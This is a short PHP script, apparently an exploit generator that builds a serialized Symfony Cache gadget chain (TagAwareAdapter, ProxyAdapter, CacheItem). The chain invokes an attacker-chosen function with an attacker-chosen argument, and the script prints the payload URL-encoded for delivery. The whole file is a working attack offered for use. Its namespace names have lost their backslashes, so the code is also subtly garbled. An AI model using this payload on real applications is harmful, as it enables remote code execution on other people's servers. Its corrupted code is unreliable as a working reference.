<?php
namespace SymfonyComponentCacheAdapter{
    class TagAwareAdapter{
        private $deferred;
        private $pool;
        function __construct($deferred, $pool){
            $this->deferred = $deferred;
            $this->pool = $pool;
        }

    }
    class ProxyAdapter{
        private $setInnerItem;
        private $poolHash;
        function __construct($setInnerItem, $poolHash){
            $this->setInnerItem = $setInnerItem;
            $this->poolHash = $poolHash;
        }
    }
}

namespace SymfonyComponentCache{
    final class CacheItem{
        protected $expiry;
        protected $poolHash;
        protected $innerItem;

        function __construct($expiry, $poolHash, $innerItem){
            $this->expiry = $expiry;
            $this->poolHash = $poolHash;
            $this->innerItem = $innerItem;
        }
    }
}

namespace{
    $function = $argv[1];
    $parameter = $argv[2];
    $b = new SymfonyComponentCacheAdapter\ProxyAdapter($function, 1);
    $d = new SymfonyComponentCache\CacheItem(1, 1, $parameter);
    $a = new SymfonyComponentCacheAdapter\TagAwareAdapter(array($d),$b);
    echo urlencode(serialize($a));
}

